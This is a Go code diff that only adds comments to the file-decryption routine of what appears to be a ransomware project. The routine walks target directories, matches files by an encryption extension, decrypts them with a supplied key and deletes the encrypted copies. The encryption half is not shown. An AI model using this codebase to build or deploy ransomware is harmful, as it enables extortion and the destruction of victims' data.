@@ -11,6 +11,7 @@ import (
 )
 
 func decryptFiles(key string) {
+
 	fmt.Println("Note: \nIf you are trying a wrong key your files will be decrypted with broken content irretrievably, please don't try keys randomly\nYou have been warned")
 	fmt.Println("Continue? Y/N")
 
@@ -23,11 +24,13 @@ func decryptFiles(key string) {
 
 	log.Println("Walking dirs and searching for encrypted files...")
 
+	// Loop over the interesting directories
 	for _, f := range InterestingDirs {
 		folder := BaseDir + f
 		filepath.Walk(folder, func(path string, f os.FileInfo, err error) error {
 			ext := filepath.Ext(path)
 			if ext == EncryptionExtension {
+				// Matching Files encrypted
 				MatchedFiles = append(MatchedFiles, path)
 				log.Println("Matched:", path)
 			}
@@ -35,22 +38,29 @@ func decryptFiles(key string) {
 		})
 	}
 
+	// Loop over the matched files
 	for _, path := range MatchedFiles {
 		log.Printf("Decrypting %s...\n", path)
+
+		// Read the file content
 		ciphertext, err := ioutil.ReadFile(path)
 		if err != nil {
 			log.Println("Error opening %s\n", path)
 			continue
 		}
 
+		// Decrypting with the key
 		text, err := crypto.Decrypt([]byte(key), ciphertext)
 		if err != nil {
+			// In case of error, continue to the next file
 			log.Println(err)
 			continue
 		}
 
+		// Write a new file with the decrypted content
 		ioutil.WriteFile(path[0:len(path)-len(filepath.Ext(path))], text, 0600)
 
+		// Remove the encrypted file
 		os.Remove(path)
 	}
 
